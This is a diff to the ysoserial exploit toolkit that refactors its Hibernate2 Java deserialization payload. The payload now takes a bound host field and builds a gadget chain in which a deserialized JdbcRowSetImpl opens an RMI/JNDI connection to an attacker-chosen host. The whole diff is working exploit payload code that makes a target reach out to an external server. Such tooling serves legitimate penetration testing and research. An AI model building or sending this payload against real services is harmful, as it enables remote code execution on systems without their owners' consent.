@@ -1,6 +1,8 @@
 package ysoserial.payloads;
 
 
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.PayloadRunner;
 
@@ -42,14 +44,23 @@ import com.sun.rowset.JdbcRowSetImpl;
 } )
 @PayloadTest( harness = "ysoserial.payloads.JRMPReverseConnectTest")
 public class Hibernate2 implements ObjectPayload<Object>, DynamicDependencies {
+	
+	@Bind private String host;
 
     public static String[] getDependencies () {
         return Hibernate1.getDependencies();
     }
    
-    public Object getObject ( String command ) throws Exception {
+    /**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
+	public Object getObject ( String command ) throws Exception {
+		return getObject();
+	}
+
+	public Object getObject ( ) throws Exception {
         JdbcRowSetImpl rs = new JdbcRowSetImpl();
-        rs.setDataSourceName("rmi: " + command);
+        rs.setDataSourceName("rmi: " + host);
         return Hibernate1.makeCaller(rs,Hibernate1.makeGetter(rs.getClass(), "getDatabaseMetaData") );
     }
 
